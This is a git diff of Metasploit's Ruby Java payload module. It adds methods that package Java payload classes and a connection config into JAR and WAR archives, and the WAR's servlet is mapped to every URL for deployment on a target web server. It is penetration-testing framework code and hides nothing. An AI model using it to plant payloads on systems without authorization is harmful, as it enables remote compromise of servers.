@@ -2,42 +2,112 @@ require 'msf/core'
 
 module Msf::Payload::Java
 
+	# 
+	# Used by stages; all java payloads need to define @class_files as an array
+	# of .class files located in data/java/
+	#
+	# The staging protocol expects any number of class files, each prepended
+	# with its length, and terminated with a 0:
+	#	[ 32-bit big endian length ][ first raw .class file]
+	#	...
+	#	[ 32-bit big endian length ][ Nth raw .class file]
+	#	[ 32-bit null ]
+	#
 	def generate_stage
+		$stdout.puts("Generating default stage")
 		stage = ''
-		@class_files.each do |path|
+		@stage_class_files.each do |path|
+			$stdout.puts("Adding raw class: #{path}")
 			fd = File.open(File.join( Msf::Config.install_root, "data", "java", path ), "rb")
 			data = fd.read(fd.stat.size)
 			stage << ([data.length].pack("N") + data)
 		end
 		stage << [0].pack("N")
 
+		$stdout.puts("Done, final length of class files: #{stage.length}")
 		stage
 	end
 
-	# This is the same for both bind and reverse tcp depending on the existence
-	# of LHOST.  If it's there, this use a reverse connection, if not, bind.
-	def tcp_stager_jar(config)
+	#
+	# Constructs the payload, used by stagers.  Returns a jar file as a +String+
+	#
+	def generate
+		generate_jar.pack
+	end
+
+	#
+	# Returns a jar file as a +Rex::Zip::Archive+
+	#
+	def generate_jar
+		$stdout.puts("Generating jar")
+		raise if not respond_to? :config
 		paths = [
 			[ "metasploit", "Payload.class" ],
-		]
+		] + @class_files
 
 		jar = Rex::Zip::Jar.new
-		paths.each do |path|
-			1.upto(path.length - 1) do |idx|
-				full = path[0,idx].join("/") + "/"
-				if !(jar.entries.map{|e|e.name}.include?(full))
-					jar.add_file(full, '')
-				end
-			end
-			fd = File.open(File.join( Msf::Config.install_root, "data", "java", path ), "rb")
-			data = fd.read(fd.stat.size)
-			jar.add_file(path.join("/"), data)
-			fd.close
-		end
+		add_class_files(jar, paths)
 		jar.build_manifest(:main_class => "metasploit.Payload")
 		jar.add_file("metasploit.dat", config)
 
 		jar
+	end
+
+	def generate_war(opts={})
+		$stdout.puts("Generating war")
+		zip = Rex::Zip::Archive.new
+
+		web_xml = %q{<?xml version="1.0"?>
+<!DOCTYPE web-app PUBLIC
+"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
+"http://java.sun.com/dtds/web-app_2_3.dtd">
+<web-app>
+<servlet>
+<servlet-name>NAME</servlet-name>
+<servlet-class>metasploit.PayloadServlet</servlet-class>
+</servlet>
+<servlet-mapping>
+<servlet-name>NAME</servlet-name>
+<url-pattern>/*</url-pattern>
+</servlet-mapping>
+</web-app>
+}
+		app_name = opts[:app_name] || "notrandom" #Rex::Text.rand_text_alpha_lower(rand(8)+8)
+
+		web_xml.gsub!(/NAME/, app_name)
+
+		paths = [
+			[ "metasploit", "Payload.class" ],
+			[ "metasploit", "PayloadServlet.class" ],
+		] + @class_files
+
+		zip.add_file('WEB-INF/', '')
+		zip.add_file('WEB-INF/web.xml', web_xml)
+		zip.add_file("WEB-INF/classes/", "")
+		add_class_files(zip, paths, "WEB-INF/classes/")
+		zip.add_file("metasploit.dat", config)
+		zip.add_file("WEB-INF/metasploit.dat", config)
+		zip.add_file("WEB-INF/classes/metasploit.dat", config)
+		$stdout.puts("config: #{config}")
+
+		zip
+	end
+
+protected
+	def add_class_files(zip, paths, base_dir="")
+		paths.each do |path|
+			$stdout.puts("Adding file: #{path}")
+			1.upto(path.length - 1) do |idx|
+				full = base_dir + path[0,idx].join("/") + "/"
+				if !(zip.entries.map{|e|e.name}.include?(full))
+					zip.add_file(full, '')
+				end
+			end
+			fd = File.open(File.join( Msf::Config.install_root, "data", "java", path ), "rb")
+			data = fd.read(fd.stat.size)
+			zip.add_file(base_dir + path.join("/"), data)
+			fd.close
+		end
 	end
 end
 
